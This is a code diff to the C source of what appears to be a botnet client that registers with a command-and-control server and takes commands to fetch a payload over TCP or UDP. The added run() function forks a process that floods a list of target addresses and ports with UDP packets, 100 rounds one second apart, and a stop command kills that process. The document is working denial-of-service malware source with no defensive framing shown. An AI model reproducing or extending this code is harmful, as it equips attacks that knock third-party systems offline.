@@ -6,6 +6,7 @@
 #include <netinet/in.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <signal.h>
 #include <arpa/inet.h>
 #include <netdb.h>
 #include "wrapper_functions.h"
@@ -65,9 +66,11 @@ void reg(int sockfd, char *ip, int port)
 	return;
 }
 
-void quit()
+void quit(int pid)
 {
 	printf("Received QUIT from CandC server.\nQuitting...\n");
+	if(pid != 0)
+		kill(pid, SIGTERM);
 	exit(0);
 }
 
@@ -106,6 +109,86 @@ void prog_tcp(char *ip, int port, char *payload)
 	return;
 }
 
+void prog_udp(char *ip, int port, char *payload)
+{
+	
+	printf("Connecting to UDP server...\n");
+	
+	char *packet = "HELLO\n";
+	
+	int sockfd = w_socket(AF_INET, SOCK_DGRAM, 0);
+	
+	struct sockaddr_in addr;
+	struct addrinfo hints, *res;
+	
+	memset(&hints, 0, sizeof hints);
+	hints.ai_family = AF_INET;
+	
+	w_getaddrinfo(ip, NULL, &hints, &res);
+	
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(port);
+	addr.sin_addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
+	
+	w_sendto(sockfd, packet, strlen(packet), 0, (struct sockaddr *)&addr, sizeof addr);
+	
+	memset(payload, 0, PAYLOAD_MAX);
+	
+	w_recvfrom(sockfd, payload, PAYLOAD_MAX, 0, NULL, NULL);
+	
+	printf("Received payload from UDP server.\n");
+	printf("New payload: %s", payload);
+	
+	close(sockfd);
+	freeaddrinfo(res);
+	
+}
+
+void run(struct msg message, char *payload)
+{
+	
+	printf("Starting the attack...\n");
+	
+	int sockfd = w_socket(AF_INET, SOCK_DGRAM, 0);
+	
+	for(int time = 0; time < 100; ++time){
+		
+		char tmp[PAYLOAD_MAX];
+		strcpy(tmp, payload);
+		
+		char *str = strtok(tmp, ":");	
+		
+		while(str != NULL){	
+			for(int i = 0; i < message.number_of_pairs; ++i){
+				
+				struct addrinfo hints, *res;
+				
+				memset(&hints, 0, sizeof(hints));
+				hints.ai_family = AF_INET;
+				hints.ai_socktype = SOCK_DGRAM;
+				
+				w_getaddrinfo(message.entry[i].ip_address, message.entry[i].port_number, &hints, &res);
+				
+				w_sendto(sockfd, str, strlen(str), 0, res->ai_addr, res->ai_addrlen);
+				
+				freeaddrinfo(res);
+				
+			}
+			str = strtok(NULL, ":");
+		}
+		sleep(1);
+	}
+	close(sockfd);
+}
+
+void stop(int pid)
+{
+	if(pid != 0)
+		kill(pid, SIGTERM);
+	
+	return;
+}
+
 int main(int argc, char **argv)
 {
 	if(argc != 3) usage();
@@ -117,36 +200,51 @@ int main(int argc, char **argv)
 	memset(&message, 0, sizeof(message));
 	
 	char payload[PAYLOAD_MAX];
+	memset(payload, 0, PAYLOAD_MAX);
+	
+	char packet[PAYLOAD_MAX];
+	memset(packet, 0, PAYLOAD_MAX);
 	
 	int sockfd = w_socket(AF_INET, SOCK_DGRAM, 0);
 	
 	reg(sockfd, candc_ip, candc_port);
 	
+	int prog_flag = 0;
+	int pid = 0;
+		
 	while(true){
 		
-		memset(payload, 0, PAYLOAD_MAX);
+		int bytes_recv = w_recv(sockfd, packet, PAYLOAD_MAX, 0);
 		
-		int bytes_recv = w_recv(sockfd, payload, PAYLOAD_MAX, 0);
+		parse_packet(&message, packet, bytes_recv);
 		
-		parse_packet(&message, payload, bytes_recv);
-		
-		memset(payload, 0, PAYLOAD_MAX);
+		memset(packet, 0, PAYLOAD_MAX);
 				
 		switch(message.command){
 			case '0':
-				quit();
+				quit(pid);
 			case '1':
 				prog_tcp(message.entry[0].ip_address,
 						atoi(message.entry[0].port_number), payload);
+				prog_flag = 1;
 				break;
 			case '2':
-				//prog_udp();
+				prog_udp(message.entry[0].ip_address,
+						atoi(message.entry[0].port_number), payload);
+				prog_flag = 1;
 				break;
 			case '3':
-				//run();
+				if(prog_flag){
+					if((pid = fork()) == 0){
+						run(message, payload);
+						exit(0);
+					}
+				}
+				else
+					printf("Cannot run, no prog received.\n");
 				break;
 			case '4':
-				//stop();
+				stop(pid);
 				break;
 			default:
 				fprintf(stderr, "Unknown command from CandC server.\nExiting...\n");
